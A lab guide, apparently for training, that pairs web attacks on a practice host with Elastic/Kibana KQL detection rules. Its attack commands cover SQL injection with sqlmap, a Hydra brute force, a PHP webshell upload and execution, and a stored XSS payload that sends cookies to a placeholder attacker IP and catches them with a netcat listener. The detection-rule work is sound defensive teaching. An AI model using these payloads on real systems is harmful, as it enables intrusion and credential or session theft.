# Part 1 — Web Attacks & Elastic Detection Rules

Logs land in `filebeat-*`. All searches are KQL in Kibana → Discover.

---

## Recon — Nikto

```bash
nikto -h http://logacademy.local
```

```kql
user_agent.original: *nikto*
http.response.status_code: 404
```

**Rule**
- Type: Custom Query
- KQL: `user_agent.original: (*nikto* OR *sqlmap* OR *gobuster* OR *dirbuster*)`
- Severity: Medium
- Name: `Web Scanner Detected`

---

## SQL Injection — search.php

```bash
curl "http://logacademy.local/search.php?q=1' OR '1'='1"
sqlmap -u "http://logacademy.local/search.php?q=1" --batch --level=2
```

```kql
url.query: (*UNION* AND *SELECT*) OR url.query: (*OR* AND *1=1*)
message: *sqlmap*
```

**Rule**
- Type: Custom Query
- KQL: `url.query: (*UNION+SELECT* OR *'+OR+'1'%3D'1*)`
- Severity: High
- Name: `SQL Injection Attempt`

---

## Brute Force — admin login

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt \
  logacademy.local http-post-form \
  "/admin/login.php:username=^USER^&password=^PASS^:Invalid" -t 20
```

```kql
http.response.status_code: 401 AND url.path: *login*
```

**Rule**
- Type: Threshold
- KQL: `http.response.status_code: 401 AND url.path: *login*`
- Threshold: `source.ip` count `10` in `1 minute`
- Severity: High
- Name: `Brute Force Login`

---

## File Upload RCE — documents/upload.php

```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php

curl -X POST http://logacademy.local/documents/upload.php \
  -F "file=@shell.php" -b "PHPSESSID=<session>"

curl "http://logacademy.local/uploads/shell.php?cmd=id"
```

```kql
url.path: /uploads/*.php
http.request.method: POST AND url.path: *upload*
```

**Rule**
- Type: Custom Query
- KQL: `url.path: /uploads/*.php`
- Severity: Critical
- Name: `PHP Webshell Execution`

---

## Stored XSS — messages.php

```bash
curl -X POST http://logacademy.local/messages.php \
  -d "body=<script>document.location='http://<KALI_IP>:8080/?c='+document.cookie</script>" \
  -b "PHPSESSID=<session>"

nc -lvnp 8080
```

```kql
message: (*<script>* OR *javascript:* OR *onerror=*)
```

**Rule**
- Type: Custom Query
- KQL: `message: (*<script>* OR *javascript:* OR *onerror=*)`
- Severity: Medium
- Name: `XSS Payload in Request`

---

## Creating a Rule in Kibana

1. Security → Rules → Create new rule
2. Pick type, paste KQL, set index `filebeat-*`
3. Set schedule: every 1 min, look-back 5 min
4. Save and enable → check alerts under Security → Alerts
